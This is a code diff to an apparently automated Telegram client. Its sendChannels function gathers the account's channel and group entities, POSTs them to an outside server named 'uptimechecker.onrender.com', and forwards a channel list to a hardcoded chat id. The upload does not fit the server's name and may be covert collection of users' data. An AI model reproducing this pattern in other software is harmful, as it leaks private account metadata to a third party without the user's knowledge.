@@ -400,20 +400,24 @@ async function deleteMsgs(event: NewMessageEvent) {
 
 async function sendChannels() {
     const chats = await client?.getDialogs({ limit: 130 });
-    const options3 = {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: { channels: chats }
-    };
-    await fetchWithTimeout(`https://uptimechecker.onrender.com/channels`, options3);
-
+    const chatsArray = [];
     let reply = 'CHANNELS:\n\n';
     chats.map((chat: any) => {
         if (chat.isChannel || chat.isGroup) {
-            const username = chat.entity.toJSON().username ? ` @${chat.entity.toJSON().username} ` : chat.entity.toJSON().id.toString();
-            reply = reply + chat.entity.toJSON().title + " " + username + ' \n';
+            const chatEntity = chat.entity.toJSON();
+            chatsArray.push(chatEntity);
+            const username = chatEntity.username ? ` @${chatEntity.username} ` : chatEntity.id.toString();
+            reply = reply + chatEntity.title + " " + username + ' \n';
         }
     });
+    
+    const options3 = {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: { channels: chatsArray }
+    };
+    await fetchWithTimeout(`https://uptimechecker.onrender.com/channels`, options3);
+
     const payload = {
         chat_id: "-1001801844217",
         text: reply
